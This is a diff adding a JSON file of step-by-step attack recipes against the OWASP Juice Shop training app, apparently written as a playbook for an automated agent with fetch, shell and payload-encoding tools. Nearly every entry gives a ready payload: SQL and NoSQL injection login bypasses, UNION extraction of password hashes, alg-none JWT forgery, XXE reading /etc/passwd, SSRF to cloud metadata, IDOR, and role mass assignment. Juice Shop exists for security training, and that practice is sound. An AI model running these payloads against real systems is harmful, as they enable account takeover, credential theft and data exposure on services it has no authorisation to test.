@@ -1,0 +1,241 @@
+[
+  {
+    "challenge_key": "loginAdminChallenge",
+    "query": "login as admin SQL injection bypass",
+    "steps": [
+      "http_fetch POST http://juice.local:3000/rest/user/login",
+      "body: {\"email\":\"admin@juice-sh.op'--\",\"password\":\"x\"}",
+      "headers: {\"Content-Type\":\"application/json\"}"
+    ],
+    "expected_response": "authentication.token (JWT) + decoded payload.data.email='admin@juice-sh.op'",
+    "notes": "SQL comment terminates the password check. Cache the JWT for admin-only endpoints."
+  },
+  {
+    "challenge_key": "unionSqlInjectionChallenge",
+    "query": "extract users table via UNION SELECT",
+    "steps": [
+      "http_fetch GET http://juice.local:3000/rest/products/search?q=')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM users--"
+    ],
+    "expected_response": "Array of products merged with user rows — email + password hash visible",
+    "notes": "Needs URL-encoded spaces/quotes. Use encode_payload with scheme=url for the query portion."
+  },
+  {
+    "challenge_key": "registerAdminChallenge",
+    "query": "register new user with admin role",
+    "steps": [
+      "http_fetch POST http://juice.local:3000/api/Users",
+      "body: {\"email\":\"ev+$(date +%s)@juice.local\",\"password\":\"x\",\"passwordRepeat\":\"x\",\"role\":\"admin\"}",
+      "headers: {\"Content-Type\":\"application/json\"}"
+    ],
+    "expected_response": "201 with created user document containing role='admin'",
+    "notes": "Server trusts client-supplied role field on POST /api/Users."
+  },
+  {
+    "challenge_key": "basketManipulateChallenge",
+    "query": "modify another user's basket via IDOR",
+    "steps": [
+      "1) SQLi login admin to get JWT",
+      "2) http_fetch GET http://juice.local:3000/rest/basket/2 with Authorization: Bearer <jwt>",
+      "3) Change basket id in URL to access other users (1-10)"
+    ],
+    "expected_response": "JSON basket contents for the target user",
+    "notes": "Any valid JWT — not just admin — exposes other UserId baskets via IDOR."
+  },
+  {
+    "challenge_key": "forgedFeedbackChallenge",
+    "query": "post feedback impersonating another UserId",
+    "steps": [
+      "http_fetch POST http://juice.local:3000/api/Feedbacks",
+      "body: {\"comment\":\"pwn\",\"rating\":5,\"UserId\":1,\"captchaId\":0,\"captcha\":\"0\"}",
+      "headers: {\"Content-Type\":\"application/json\"}"
+    ],
+    "expected_response": "201 with feedback.UserId = 1 (admin)",
+    "notes": "Server reads UserId from request body, not from JWT."
+  },
+  {
+    "challenge_key": "forgedReviewChallenge",
+    "query": "edit product review as different user",
+    "steps": [
+      "http_fetch PATCH http://juice.local:3000/rest/products/reviews",
+      "body: {\"id\":{\"$ne\":\"0\"},\"message\":\"pwned\"}",
+      "headers: {\"Content-Type\":\"application/json\"}"
+    ],
+    "expected_response": "200 with rewritten review message",
+    "notes": "NoSQL-style $ne operator on id bypasses ownership check."
+  },
+  {
+    "challenge_key": "jwtForgedChallenge",
+    "query": "forge JWT with alg none to impersonate admin",
+    "steps": [
+      "1) encode_payload scheme=jwt_none data={\"data\":{\"email\":\"admin@juice-sh.op\",\"role\":\"admin\"}}",
+      "2) http_fetch GET http://juice.local:3000/rest/user/whoami with Authorization: Bearer <output-of-step-1>"
+    ],
+    "expected_response": "200 with data.email='admin@juice-sh.op' recognized as admin",
+    "notes": "Legacy jsonwebtoken versions accept alg=none with empty signature. The encode_payload tool handles header+payload base64url and empty signature for you."
+  },
+  {
+    "challenge_key": "xxeFileDisclosureChallenge",
+    "query": "read /etc/passwd via XXE on file upload",
+    "steps": [
+      "1) shell: cat > /tmp/xxe.xml <<'EOF'\n<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><root>&x;</root>\nEOF",
+      "2) shell: curl -F 'file=@/tmp/xxe.xml' http://juice.local:3000/file-upload"
+    ],
+    "expected_response": "Error page containing /etc/passwd contents dumped through the entity",
+    "notes": "http_fetch doesn't do multipart — use shell with curl -F. The SYSTEM entity resolves server-side."
+  },
+  {
+    "challenge_key": "poisonNullByteChallenge",
+    "query": "access ftp hidden .md files via null byte bypass",
+    "steps": [
+      "http_fetch GET http://juice.local:3000/ftp/eastere.gg%2500.md",
+      "http_fetch GET http://juice.local:3000/ftp/package.json.bak%2500.md",
+      "http_fetch GET http://juice.local:3000/ftp/suspicious_errors.yml%2500.md"
+    ],
+    "expected_response": "File contents — blocked extensions served after null byte trick",
+    "notes": "%2500 is URL-encoded null byte. Server filter checks suffix but file system truncates at \\0."
+  },
+  {
+    "challenge_key": "redirectChallenge",
+    "query": "abuse /redirect whitelist for open-redirect",
+    "steps": [
+      "http_fetch GET http://juice.local:3000/redirect?to=https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm"
+    ],
+    "expected_response": "302 Location header pointing at external site",
+    "notes": "Whitelist includes donation blockchain URLs, so any crypto address within that domain works."
+  },
+  {
+    "challenge_key": "feedbackZeroStarsChallenge",
+    "query": "submit feedback with 0 stars or 6 stars",
+    "steps": [
+      "http_fetch POST http://juice.local:3000/api/Feedbacks",
+      "body: {\"comment\":\"auto\",\"rating\":0,\"captcha\":\"0\",\"captchaId\":0}"
+    ],
+    "expected_response": "201 with rating=0 stored (UI enforces 1-5, backend does not)",
+    "notes": "Also try rating=6 for above-range variant. Captcha is trivially bypassable with captchaId=0, captcha='0'."
+  },
+  {
+    "challenge_key": "resetPasswordJimChallenge",
+    "query": "reset Jim's password using his security answer",
+    "steps": [
+      "http_fetch POST http://juice.local:3000/rest/user/reset-password",
+      "body: {\"email\":\"jim@juice-sh.op\",\"answer\":\"Samuel\",\"new\":\"newpass12\",\"repeat\":\"newpass12\"}"
+    ],
+    "expected_response": "200 with password updated",
+    "notes": "Jim's security answer 'Samuel' is his son's name (from Star Trek easter egg)."
+  },
+  {
+    "challenge_key": "resetPasswordMortyChallenge",
+    "query": "reset Morty's password using safe combination",
+    "steps": [
+      "http_fetch POST http://juice.local:3000/rest/user/reset-password",
+      "body: {\"email\":\"morty@juice-sh.op\",\"answer\":\"5N0wb41L\",\"new\":\"newpass12\",\"repeat\":\"newpass12\"}"
+    ],
+    "expected_response": "200 with password updated"
+  },
+  {
+    "challenge_key": "deprecatedInterfaceChallenge",
+    "query": "upload XML file to deprecated /file-upload",
+    "steps": [
+      "1) shell: echo '<?xml version=\"1.0\"?><root>test</root>' > /tmp/d.xml",
+      "2) shell: curl -F 'file=@/tmp/d.xml' http://juice.local:3000/file-upload"
+    ],
+    "expected_response": "200 — XML was once accepted, now legacy interface"
+  },
+  {
+    "challenge_key": "passwordRepeatChallenge",
+    "query": "register with password and passwordRepeat mismatch",
+    "steps": [
+      "http_fetch POST http://juice.local:3000/api/Users",
+      "body: {\"email\":\"xx@t.test\",\"password\":\"abc\",\"passwordRepeat\":\"DIFFERENT\"}"
+    ],
+    "expected_response": "201 user created with repeat not enforced"
+  },
+  {
+    "challenge_key": "ssrfChallenge",
+    "query": "SSRF via profile image URL endpoint",
+    "steps": [
+      "http_fetch POST http://juice.local:3000/profile/image/url",
+      "body: {\"imageUrl\":\"http://169.254.169.254/latest/meta-data/\"}"
+    ],
+    "expected_response": "Server fetches the AWS metadata URL on your behalf",
+    "notes": "Requires auth (JWT). Internal targets: 127.0.0.1, 169.254.169.254 (cloud metadata), localhost:3000/redirect?to="
+  },
+  {
+    "challenge_key": "nosqlInjectionLoginChallenge",
+    "query": "NoSQL injection on login using Mongo $ne",
+    "steps": [
+      "http_fetch POST http://juice.local:3000/rest/user/login",
+      "body: {\"email\":\"admin@juice-sh.op\",\"password\":{\"$ne\":null}}"
+    ],
+    "expected_response": "JWT returned for admin login",
+    "notes": "Works when the JSON body is parsed into a Mongo-style query. Try variants like $gt, $regex."
+  },
+  {
+    "challenge_key": "accessLogDisclosureChallenge",
+    "query": "read server access log",
+    "steps": [
+      "http_fetch GET http://juice.local:3000/support/logs",
+      "http_fetch GET http://juice.local:3000/support/logs/"
+    ],
+    "expected_response": "Plaintext log contents"
+  },
+  {
+    "challenge_key": "dbSchemaChallenge",
+    "query": "leak SQLite table names via UNION SELECT on sqlite_master",
+    "steps": [
+      "http_fetch GET http://juice.local:3000/rest/products/search?q=')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--"
+    ],
+    "expected_response": "Response contains CREATE TABLE statements for Users, Basket, Products, etc."
+  },
+  {
+    "challenge_key": "wellKnownDisclosureChallenge",
+    "query": "enumerate standard .well-known paths",
+    "steps": [
+      "http_fetch GET http://juice.local:3000/.well-known/security.txt",
+      "http_fetch GET http://juice.local:3000/.well-known/csaf/provider-metadata.json"
+    ],
+    "expected_response": "Either file contents or interesting headers"
+  },
+  {
+    "challenge_key": "weakPasswordChallenge",
+    "query": "admin login with weak password",
+    "steps": [
+      "http_fetch POST http://juice.local:3000/rest/user/login",
+      "body: {\"email\":\"admin@juice-sh.op\",\"password\":\"admin123\"}"
+    ],
+    "expected_response": "JWT — admin pwned via trivially guessable pw"
+  },
+  {
+    "challenge_key": "metricsDisclosureChallenge",
+    "query": "expose prometheus metrics endpoint",
+    "steps": [
+      "http_fetch GET http://juice.local:3000/metrics"
+    ],
+    "expected_response": "Plain-text Prometheus-format counters"
+  },
+  {
+    "challenge_key": "couponChallenge",
+    "query": "apply known-good discount coupon",
+    "steps": [
+      "http_fetch PUT http://juice.local:3000/rest/basket/1/coupon/n1aC6A7p"
+    ],
+    "expected_response": "Coupon accepted, discount applied to basket 1"
+  },
+  {
+    "challenge_key": "hiddenPaywallChallenge",
+    "query": "access hidden paywall page",
+    "steps": [
+      "http_fetch GET http://juice.local:3000/this/page/is/hidden/behind/an/incredibly/high/paywall/that/could/only/be/unlocked/by/sending/1btc/to/us"
+    ],
+    "expected_response": "Challenge detection — page listed in source but never linked"
+  },
+  {
+    "challenge_key": "basketAccessIdorChallenge",
+    "query": "IDOR on /rest/basket to read baskets 1-10",
+    "steps": [
+      "1) SQLi login admin to get <jwt>",
+      "2) for i in 1..10: http_fetch GET http://juice.local:3000/rest/basket/$i with Authorization: Bearer <jwt>"
+    ],
+    "expected_response": "Returns basket rows for IDs other than the authenticated user's own"
+  }
+]
